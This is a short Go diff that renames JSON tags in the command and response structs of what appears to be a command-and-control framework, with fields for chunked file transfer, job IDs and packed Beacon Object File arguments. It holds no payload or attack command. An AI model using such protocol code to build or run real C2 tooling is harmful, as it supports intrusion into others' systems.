@@ -21,7 +21,7 @@ type Command struct {
 	RemotePath       string `json:"rp"`
 	CurrentChunk     int    `json:"cc"`
 	TotalChunks      int    `json:"tc"`
-	Data             string `json:"data"`
+	Data             string `json:"da"`
 	Arguments        string `json:"ar"`          // Base64-encoded packed BOF arguments
 	Timestamp        string `json:"ts"`
 	JobID            string `json:"ji"`
@@ -48,9 +48,9 @@ type CommandResponse struct {
 	RemotePath   string `json:"rp"`
 	CurrentChunk int    `json:"cc"`
 	TotalChunks  int    `json:"tc"`
-	Data         string `json:"data"`
+	Data         string `json:"da"`
 	Output       string `json:"ou"`
-	Error        string `json:"error,omitempty"`
+	Error        string `json:"er,omitempty"`
 	ExitCode     int    `json:"ec"`
 	Timestamp    string `json:"ts"`
 	JobID        string `json:"ji"` // Add this field
